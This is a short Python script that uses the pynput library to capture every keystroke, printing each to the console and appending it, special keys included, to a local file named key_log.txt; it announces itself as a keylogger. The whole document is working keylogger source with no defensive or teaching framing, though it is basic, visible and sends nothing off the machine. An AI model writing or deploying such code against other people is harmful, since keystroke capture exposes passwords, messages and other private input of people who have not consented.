from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        print(f"Key pressed: {key.char}")
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        print(f"Special key pressed: {key}")
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")

def main():
    print("Starting keylogger. Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
